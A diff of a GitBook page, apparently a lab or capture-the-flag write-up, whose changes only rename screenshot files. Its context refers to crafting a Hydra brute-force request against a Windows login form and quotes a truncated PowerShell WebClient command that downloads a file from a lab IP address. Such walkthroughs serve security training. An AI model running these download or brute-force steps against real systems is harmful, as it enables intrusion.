@@ -8,7 +8,7 @@
 
 **What request type is the Windows website login form using?**
 
-<figure><img src="../../.gitbook/assets/image (11) (3).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (11) (3) (1).png" alt=""><figcaption></figcaption></figure>
 
 **Crafting request for Hydra**
 
@@ -159,5 +159,5 @@ powershell "(New-Object System.Net.WebClient).Downloadfile('http://10.10.218.233
 
 <figure><img src="../../.gitbook/assets/image (16) (2) (1).png" alt=""><figcaption></figcaption></figure>
 
-<figure><img src="../../.gitbook/assets/image (8) (2).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (8) (2) (1).png" alt=""><figcaption></figcaption></figure>
 
